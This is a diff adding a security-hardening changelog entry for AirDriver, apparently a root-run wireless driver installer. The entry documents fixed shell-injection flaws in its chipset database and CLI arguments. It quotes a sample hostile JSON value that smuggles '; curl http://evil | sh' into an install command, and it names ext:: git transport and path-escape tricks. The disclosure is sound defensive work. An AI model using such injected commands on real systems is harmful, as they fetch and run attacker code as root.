@@ -2,6 +2,63 @@
 
 All notable changes to AirDriver are documented here.
 
+## [0.9.1] — 2026-09-17 · security hardening
+
+A security review of the whole codebase, on the premise that matters here:
+**AirDriver runs as root and executes shell commands**, so the question is
+whether anything it did not author can end up running.
+
+### Fixed — the chipset database could execute as root (the real one)
+
+`chipsets.json` is contributed to by pull request, and its `package`, `module`,
+`repo`, `path` and `blacklist` values were interpolated **unquoted** into root
+commands. A plausible-looking entry such as
+
+```json
+{ "method": "apt", "package": "realtek-dkms; curl http://evil | sh" }
+```
+
+produced `sudo apt-get install -y realtek-dkms; curl http://evil | sh`, and
+`airdriver db --check` — the CI gate — accepted it. The same held for a
+`blacklist` entry (which also reached `/etc/modprobe.d`, where a newline could
+smuggle in extra directives), for a `repo` using git's command-executing
+`ext::` transport, and for an `offline` `path` escaping `data/` via `..`.
+
+Fixed in two layers:
+
+1. **Rejected at the gate** — `ChipsetDB.problems()` now validates each of those
+   fields against a strict whitelist of shapes, so CI fails a hostile pull
+   request at review time. `repo` is pinned to `https://`; `path` must stay
+   under `data/`.
+2. **Quoted at the point of use** — every such value is `shlex.quote`d, so even a
+   hand-edited database cannot break out. `offline_source_dir()` now resolves and
+   confirms containment, and `blacklist_snippet()` refuses unsafe module names.
+
+### Fixed — command-line arguments reaching root shells
+
+`modeswitch` now requires a literal `vid:pid`; `rebuild` quotes its target.
+Defence in depth (you are already root), but it makes AirDriver safe to script.
+
+### Fixed — `doctor` painted Secure Boot green
+
+The row-status flag was computed and then never used, so the colour only ever
+reddened a literal `MISSING`. **Secure Boot: on printed green** — precisely the
+condition that makes a freshly built module refuse to load. It is now coloured as
+the problem it is, while `Internet: no` and `Root: no` stay neutral, as intended.
+
+### Added
+
+* `SECURITY.md` — threat model, what is trusted, what deliberately isn't
+  (out-of-tree driver sources are compiled as root; that is what installing a
+  driver means), and how to report a vulnerability.
+* `tests/test_security.py` — 14 regression tests covering both layers, plus a
+  test that the *shipped* database still passes, so the rules can't drift into
+  being too strict.
+
+### Housekeeping
+
+`pyflakes` is clean across the package, tests and scripts (dead imports removed).
+
 ## [0.9.0] — 2026-09-16 · "One Command"
 
 Every capability AirDriver has was already here — `scan`, `install`, `verify`,
